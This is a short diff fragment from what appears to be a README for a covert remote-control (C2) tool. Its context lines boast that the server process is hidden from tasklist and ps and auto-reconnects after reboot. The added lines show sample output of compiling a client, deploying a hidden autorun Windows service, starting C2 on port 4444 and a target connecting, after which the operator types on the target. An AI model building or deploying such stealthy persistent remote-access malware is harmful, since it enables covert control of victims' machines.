@@ -53,6 +53,16 @@ Windows: tasklist | findstr server   → Nothing
 Linux:   ps aux | grep server       → PID 1 child only
 Both:    Reboot → Auto-reconnects
 
+output example
 
+[+] C source files saved
+[+] Client compiled
+[+] Windows server.exe compiled
+[+] Windows service deployed (hidden + autorun)
+[*] Starting C2 on port 4444...
+
+[+] Target connected: 192.168.1.100:54321
+Hello World!          <- You type on target
+[CTRL+C to stop]
 
 
